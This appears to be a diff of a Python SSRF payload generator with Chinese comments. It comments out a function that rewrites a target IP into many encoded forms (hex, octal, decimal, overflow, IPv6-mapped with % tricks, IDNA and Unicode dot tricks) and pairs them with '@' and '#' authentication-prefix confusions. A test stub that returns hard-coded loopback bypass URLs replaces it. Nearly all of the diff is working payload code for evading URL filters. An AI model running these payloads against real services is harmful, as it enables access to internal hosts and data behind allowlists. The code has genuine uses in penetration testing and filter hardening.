@@ -276,214 +276,219 @@ def generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, 
 
 
 # 生成所有Payload并返回
-def all_payload(ip, port, site, export='export') -> list:
-    payload = []
-    if not valid_ip(ip):
-        logging.error(f'{ip} is not a valid IP')
-        return []
-    # 分割得到4个IP值
-    ip_frag3, ip_frag2, ip_frag1, ip_frag0 = ip.split(".")
-    rand_prefix_text = random_text()
-    rand_prefix_text_spec = random_text_spec()
-    random_prefix_valid_site = site
-    filename = ''
-    if export == '':
-        pass
-    elif export == 'export':
-        filename = "./result/payload/payload_origin/payload_origin_" + ip + "_" + str(datetime.datetime.now().strftime('%Y.%m.%d_%H.%M.%S')) + '.txt'
-    else:
-        logging.error('input export or Nothing, other words are forbidden')
-
-    # Case 1 - Dotted hexadecimal
-    print()
-    print("Dotted hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 转换为16进制，并且加上了0X
-    ip1 = hex_single(ip_frag3, "yes") + "." + hex_single(ip_frag2, "yes") + "." + hex_single(ip_frag1, "yes") + "." + \
-          hex_single(ip_frag0, "yes")
-    # 添加至当前payload列表
-    payload.extend(generate_payload(ip1, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 2 - Dotless hexadecimal
-    print("Dotless hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 不带点的十六进制，开头加上0X即可
-    ip2 = hex_single(ip_frag3, "yes") + hex_single(ip_frag2, "no") + hex_single(ip_frag1, "no") + hex_single(ip_frag0,
-                                                                                                             "no")
-    payload.extend(generate_payload(ip2, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 3 - Dotless decimal
-    print("Dotless decimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 将IP转换为数值
-    ip3 = str(decimal_single(ip_frag3, 3) + decimal_single(ip_frag2, 2) +
-              decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
-    payload.extend(generate_payload(ip3, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 4 - Dotted decimal with overflow(256)
-    print("Dotted decimal with overflow(256) IP Address of:" + " http://" + ip +
-          " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 给ip地址都加上256
-    ip4 = dec_overflow_single(ip_frag3) + "." + dec_overflow_single(ip_frag2) + "." + dec_overflow_single(
-        ip_frag1) + "." + dec_overflow_single(ip_frag0)
-    payload.extend(generate_payload(ip4, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 5 - Dotted octal
-    print("Dotted octal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 带点的八进制
-    ip5 = oct_single(ip_frag3) + "." + oct_single(ip_frag2) + "." + oct_single(ip_frag1) + "." + oct_single(ip_frag0)
-    payload.extend(generate_payload(ip5, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 6 - Dotted octal with padding
-    print("Dotted octal with padding IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # oct_single：转换为8进制并且去掉o
-    # eg: 127.0.0.1转换为以下内容：
-    # http://00177.0000.00000.000001:80/
-    ip6 = '0' + oct_single(ip_frag3) + "." + '00' + oct_single(ip_frag2) + "." + \
-          '000' + oct_single(ip_frag1) + "." + '0000' + oct_single(ip_frag0)
-    payload.extend(generate_payload(ip6, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 7 - IPv6 compact version
-    print("IPv6 compact version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # IPv4兼容地址
-    # 零压缩法可以用来缩减其长度
-    # 如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示
-    ip7 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
-    payload.extend(generate_payload(ip7, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 17 - IPv6 compact version with % bypass
-    print("IPv6 compact version with % bypass IP Address of:" +
-          " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # IPv4兼容地址
-    # 加上百分号和3个随机数字
-    ip13 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
-    payload.extend(generate_payload(ip13, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 8 - IPv6 mapped version
-    print("IPv6 mapped version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # IPv4映像地址
-    # 比如::ffff:192.168.89.9，是0000:0000:0000:0000:0000:ffff:c0a8:5909的简化写法
-    ip8 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
-    payload.extend(generate_payload(ip8, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 16 - IPv6 mapped version with % bypass
-    print("IPv6 mapped version with % bypass IP Address of:" +
-          " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # IPv4映像地址
-    # 加上百分号和3个随机数字
-    ip14 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
-    payload.extend(generate_payload(ip14, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
-    print("Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:" +
-          " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 十六进制 + 八进制 + 剩余两个IP值的数值和
-    ip9 = hex_single(ip_frag3, "yes") + "." + oct_single(ip_frag2) + "." + str(
-        decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
-    payload.extend(generate_payload(ip9, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 10 - Dotted hexadecimal + Dotless decimal
-    print("Dotted hexadecimal + Dotless decimal IP Address of:" +
-          " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 十六进制 + 剩余三个IP值的数值和
-    ip10 = hex_single(ip_frag3, "yes") + "." + str(
-        decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
-    payload.extend(generate_payload(ip10, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 11 - Dotted octal with padding + Dotless decimal
-    print("Dotted octal with padding + Dotless decimal IP Address of:" +
-          " http://" + ip + " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 八进制 + 剩余三个IP值的数值和
-    ip11 = '0' + oct_single(ip_frag3) + "." + \
-           str(decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
-    payload.extend(generate_payload(ip11, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
-    print("Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:" +
-          " http://" + ip +
-          " + authentication prefix/bypass combo list")
-    print('======================================================================================================')
-    # 八进制 + 十六进制 + 剩余两个IP值的数值和
-    ip12 = '0' + oct_single(ip_frag3) + "." + hex_single(ip_frag2, "yes") + "." + str(
-        decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
-    payload.extend(generate_payload(ip12, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
-
-    # Case 13 - Abusing IDNA Standard
-    print("Abusing IDNA Standard: "
-          "http://ß.localdomain.pw/" + ' -> ' +
-          'http://cc.localdomain.pw/' + ' => ' +
-          'DNS' + ' => ' +
-          '127.127.127.127')
-    print('======================================================================================================')
-    payload.append('http://ß.localdomain.pw/')
-
-    # Case 14 - Abusing 。and ｡
-    IPAddressParts = ip.split(".")
-    print("Abusing 。and ｡ and ．: " + "http://" +
-          IPAddressParts[0] + "。" + IPAddressParts[1] + "。" +
-          IPAddressParts[2] + "。" + IPAddressParts[3] + "/" + " and " +
-          "http://" +
-          IPAddressParts[0] + "｡" + IPAddressParts[1] + "｡" +
-          IPAddressParts[2] + "｡" + IPAddressParts[3] + "/" + " and " +
-          "http://" +
-          IPAddressParts[0] + "．" + IPAddressParts[1] + "．" +
-          IPAddressParts[2] + "．" + IPAddressParts[3] + "/" + ' -> ' +
-          "http://" +
-          IPAddressParts[0] + "." + IPAddressParts[1] + "." +
-          IPAddressParts[2] + "." + IPAddressParts[3] + "/")
-    print('======================================================================================================')
-    # 点分割符号替换
-    payload.append('http://' +
-                   IPAddressParts[0] + '。' + IPAddressParts[1] + '。' +
-                   IPAddressParts[2] + '。' + IPAddressParts[3] + '/')
-    payload.append('http://' +
-                   IPAddressParts[0] + '｡' + IPAddressParts[1] + '｡' +
-                   IPAddressParts[2] + '｡' + IPAddressParts[3] + '/')
-    payload.append('http://' +
-                   IPAddressParts[0] + '．' + IPAddressParts[1] + '．' +
-                   IPAddressParts[2] + '．' + IPAddressParts[3] + '/')
-    print('======================================================================================================')
-    print()
-
-    # Case 15 Abusing Unicode
-    print("Abusing Unicode:" + 'http://' + convert_ip_2_random_unicode_value(ip) + '        -> ' + "http://" + ip)
-    print('======================================================================================================')
-    # 封闭式字母数字字符
-    payload.extend(
-        generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, ip8, ip14, ip9, ip10, ip11, ip12))
-
-    if export == 'export':
-        python_version = (platform.python_version())
-        major, minor, patch_level = python_version.split(".")
-        # Python3
-        if major == "3":
-            with open(filename, 'w', encoding='utf8') as f:
-                for p in payload:
-                    f.write(p + '\n')
-        else:
-            with open(filename, 'wb', encoding='utf8') as f:
-                for p in payload:
-                    f.write(p + '\n')
-        print("Results are exported to: " + filename, sep='')
-        print("\n" + '-----------------------------------------------------------------------------------------------')
-    print()
-    return payload
-
-
-# # 测试使用
 # def all_payload(ip, port, site, export='export') -> list:
-#     res = ['http://127.0.0.1']
-#     return res
+#     payload = []
+#     if not valid_ip(ip):
+#         logging.error(f'{ip} is not a valid IP')
+#         return []
+#     # 分割得到4个IP值
+#     ip_frag3, ip_frag2, ip_frag1, ip_frag0 = ip.split(".")
+#     rand_prefix_text = random_text()
+#     rand_prefix_text_spec = random_text_spec()
+#     random_prefix_valid_site = site
+#     filename = ''
+#     if export == '':
+#         pass
+#     elif export == 'export':
+#         filename = "./result/payload/payload_origin/payload_origin_" + ip + "_" + str(datetime.datetime.now().strftime('%Y.%m.%d_%H.%M.%S')) + '.txt'
+#     else:
+#         logging.error('input export or Nothing, other words are forbidden')
+#
+#     # Case 1 - Dotted hexadecimal
+#     print()
+#     print("Dotted hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 转换为16进制，并且加上了0X
+#     ip1 = hex_single(ip_frag3, "yes") + "." + hex_single(ip_frag2, "yes") + "." + hex_single(ip_frag1, "yes") + "." + \
+#           hex_single(ip_frag0, "yes")
+#     # 添加至当前payload列表
+#     payload.extend(generate_payload(ip1, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 2 - Dotless hexadecimal
+#     print("Dotless hexadecimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 不带点的十六进制，开头加上0X即可
+#     ip2 = hex_single(ip_frag3, "yes") + hex_single(ip_frag2, "no") + hex_single(ip_frag1, "no") + hex_single(ip_frag0,
+#                                                                                                              "no")
+#     payload.extend(generate_payload(ip2, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 3 - Dotless decimal
+#     print("Dotless decimal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 将IP转换为数值
+#     ip3 = str(decimal_single(ip_frag3, 3) + decimal_single(ip_frag2, 2) +
+#               decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
+#     payload.extend(generate_payload(ip3, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 4 - Dotted decimal with overflow(256)
+#     print("Dotted decimal with overflow(256) IP Address of:" + " http://" + ip +
+#           " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 给ip地址都加上256
+#     ip4 = dec_overflow_single(ip_frag3) + "." + dec_overflow_single(ip_frag2) + "." + dec_overflow_single(
+#         ip_frag1) + "." + dec_overflow_single(ip_frag0)
+#     payload.extend(generate_payload(ip4, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 5 - Dotted octal
+#     print("Dotted octal IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 带点的八进制
+#     ip5 = oct_single(ip_frag3) + "." + oct_single(ip_frag2) + "." + oct_single(ip_frag1) + "." + oct_single(ip_frag0)
+#     payload.extend(generate_payload(ip5, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 6 - Dotted octal with padding
+#     print("Dotted octal with padding IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # oct_single：转换为8进制并且去掉o
+#     # eg: 127.0.0.1转换为以下内容：
+#     # http://00177.0000.00000.000001:80/
+#     ip6 = '0' + oct_single(ip_frag3) + "." + '00' + oct_single(ip_frag2) + "." + \
+#           '000' + oct_single(ip_frag1) + "." + '0000' + oct_single(ip_frag0)
+#     payload.extend(generate_payload(ip6, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 7 - IPv6 compact version
+#     print("IPv6 compact version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # IPv4兼容地址
+#     # 零压缩法可以用来缩减其长度
+#     # 如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示
+#     ip7 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
+#     payload.extend(generate_payload(ip7, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 17 - IPv6 compact version with % bypass
+#     print("IPv6 compact version with % bypass IP Address of:" +
+#           " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # IPv4兼容地址
+#     # 加上百分号和3个随机数字
+#     ip13 = '[::' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
+#     payload.extend(generate_payload(ip13, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 8 - IPv6 mapped version
+#     print("IPv6 mapped version IP Address of:" + " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # IPv4映像地址
+#     # 比如::ffff:192.168.89.9，是0000:0000:0000:0000:0000:ffff:c0a8:5909的简化写法
+#     ip8 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + ']'
+#     payload.extend(generate_payload(ip8, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 16 - IPv6 mapped version with % bypass
+#     print("IPv6 mapped version with % bypass IP Address of:" +
+#           " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # IPv4映像地址
+#     # 加上百分号和3个随机数字
+#     ip14 = '[::ffff:' + ip_frag3 + "." + ip_frag2 + "." + ip_frag1 + "." + ip_frag0 + '%' + RANDOM3NUMBERS + ']'
+#     payload.extend(generate_payload(ip14, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal
+#     print("Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:" +
+#           " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 十六进制 + 八进制 + 剩余两个IP值的数值和
+#     ip9 = hex_single(ip_frag3, "yes") + "." + oct_single(ip_frag2) + "." + str(
+#         decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
+#     payload.extend(generate_payload(ip9, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 10 - Dotted hexadecimal + Dotless decimal
+#     print("Dotted hexadecimal + Dotless decimal IP Address of:" +
+#           " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 十六进制 + 剩余三个IP值的数值和
+#     ip10 = hex_single(ip_frag3, "yes") + "." + str(
+#         decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
+#     payload.extend(generate_payload(ip10, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 11 - Dotted octal with padding + Dotless decimal
+#     print("Dotted octal with padding + Dotless decimal IP Address of:" +
+#           " http://" + ip + " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 八进制 + 剩余三个IP值的数值和
+#     ip11 = '0' + oct_single(ip_frag3) + "." + \
+#            str(decimal_single(ip_frag2, 2) + decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
+#     payload.extend(generate_payload(ip11, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 12 - Dotted octal with padding + Dotted hexadecimal + Dotless decimal
+#     print("Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:" +
+#           " http://" + ip +
+#           " + authentication prefix/bypass combo list")
+#     print('======================================================================================================')
+#     # 八进制 + 十六进制 + 剩余两个IP值的数值和
+#     ip12 = '0' + oct_single(ip_frag3) + "." + hex_single(ip_frag2, "yes") + "." + str(
+#         decimal_single(ip_frag1, 1) + decimal_single(ip_frag0, 0))
+#     payload.extend(generate_payload(ip12, port, rand_prefix_text, rand_prefix_text_spec, random_prefix_valid_site))
+#
+#     # Case 13 - Abusing IDNA Standard
+#     print("Abusing IDNA Standard: "
+#           "http://ß.localdomain.pw/" + ' -> ' +
+#           'http://cc.localdomain.pw/' + ' => ' +
+#           'DNS' + ' => ' +
+#           '127.127.127.127')
+#     print('======================================================================================================')
+#     payload.append('http://ß.localdomain.pw/')
+#
+#     # Case 14 - Abusing 。and ｡
+#     IPAddressParts = ip.split(".")
+#     print("Abusing 。and ｡ and ．: " + "http://" +
+#           IPAddressParts[0] + "。" + IPAddressParts[1] + "。" +
+#           IPAddressParts[2] + "。" + IPAddressParts[3] + "/" + " and " +
+#           "http://" +
+#           IPAddressParts[0] + "｡" + IPAddressParts[1] + "｡" +
+#           IPAddressParts[2] + "｡" + IPAddressParts[3] + "/" + " and " +
+#           "http://" +
+#           IPAddressParts[0] + "．" + IPAddressParts[1] + "．" +
+#           IPAddressParts[2] + "．" + IPAddressParts[3] + "/" + ' -> ' +
+#           "http://" +
+#           IPAddressParts[0] + "." + IPAddressParts[1] + "." +
+#           IPAddressParts[2] + "." + IPAddressParts[3] + "/")
+#     print('======================================================================================================')
+#     # 点分割符号替换
+#     payload.append('http://' +
+#                    IPAddressParts[0] + '。' + IPAddressParts[1] + '。' +
+#                    IPAddressParts[2] + '。' + IPAddressParts[3] + '/')
+#     payload.append('http://' +
+#                    IPAddressParts[0] + '｡' + IPAddressParts[1] + '｡' +
+#                    IPAddressParts[2] + '｡' + IPAddressParts[3] + '/')
+#     payload.append('http://' +
+#                    IPAddressParts[0] + '．' + IPAddressParts[1] + '．' +
+#                    IPAddressParts[2] + '．' + IPAddressParts[3] + '/')
+#     print('======================================================================================================')
+#     print()
+#
+#     # Case 15 Abusing Unicode
+#     print("Abusing Unicode:" + 'http://' + convert_ip_2_random_unicode_value(ip) + '        -> ' + "http://" + ip)
+#     print('======================================================================================================')
+#     # 封闭式字母数字字符
+#     payload.extend(
+#         generate_payload_unicode(port, ip, ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip13, ip8, ip14, ip9, ip10, ip11, ip12))
+#
+#     if export == 'export':
+#         python_version = (platform.python_version())
+#         major, minor, patch_level = python_version.split(".")
+#         # Python3
+#         if major == "3":
+#             with open(filename, 'w', encoding='utf8') as f:
+#                 for p in payload:
+#                     f.write(p + '\n')
+#         else:
+#             with open(filename, 'wb', encoding='utf8') as f:
+#                 for p in payload:
+#                     f.write(p + '\n')
+#         print("Results are exported to: " + filename, sep='')
+#         print("\n" + '-----------------------------------------------------------------------------------------------')
+#     print()
+#     return payload
+
+
+# 测试使用
+def all_payload(ip, port, site, export='export') -> list:
+    res = ['http:127.0.0.1', 'http://0x7f.0x0.0x0.0x1:80/', 'http://0x7f.0x0.0x0.0x1:80?@www.google.com/',
+           'http://0x7f.0x0.0x0.0x1:80#@www.google.com/', 'http://www.google.com@0x7f.0x0.0x0.0x1:80/',
+           'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80/', 'http://)rEg(7G7$4Wmws$0@0x7f.0x0.0x0.0x1:80/',
+           'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80@www.google.com/',
+           'http://)rEg(7G7$4Wmws$0@0x7f.0x0.0x0.0x1:@www.google.com/',
+           'http://dhrQNXi1LqQ61@0x7f.0x0.0x0.0x1:80+@www.google.com/']
+    return res
 
 
 if __name__ == '__main__':
